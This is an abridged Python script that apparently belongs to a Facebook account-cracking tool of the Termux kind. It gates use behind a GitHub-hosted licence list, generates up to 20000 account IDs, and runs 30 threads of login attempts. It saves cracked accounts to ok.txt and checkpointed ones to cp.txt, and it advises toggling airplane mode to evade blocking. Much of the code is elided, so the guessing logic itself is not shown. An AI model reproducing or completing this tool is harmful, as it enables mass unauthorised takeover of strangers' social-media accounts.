...
def helpnote():
    ...
    subprocess.check_output(['am', 'start', 'https://www.facebook.com/profile.php?id=100076383105552'])
    exit(' [*] Facebook :  https://www.facebook.com/profile.php?id=100076383105552')
...
class Main():
    ...
    def __init__(self):
        ...
        self.loop = 0
        try:
            plr = requests.get('https://github.com/AdeedSamad90/file/blob/main/approved.txt').text
            if basesplit in plr:
                key = basesplit
    ...
    def fbtua(self):
        ...
        xx = 999999999
        idx = '1000'
        limit = int(input('\x1b[0;92m [+] Enter Limit \x1b[0;97m(20000 Maximum): \x1b[0;92m'))
        if limit > 20000:
        ...
        try:
            ...
            with ThreadPoolExecutor(max_workers=30) as (coeg):
                ...
                print '\n%s [+] OK result save in  -> ok.txt' % G
                print '%s [+] CP result save  in -> cp.txt' % Y
                print '%s [!] if no result turn on AIRPLANE mode 5 second\x1b[0m\n' % R
                for user in self.id:
    ...
    def old_9(self):
        ...
        xx = 999999
        idx = '1000'
        limit = int(input('\x1b[0;92m [+] ENTER LIMIT \x1b[0;91m(20000 MAX): \x1b[0;92m'))
        if limit > 20000:
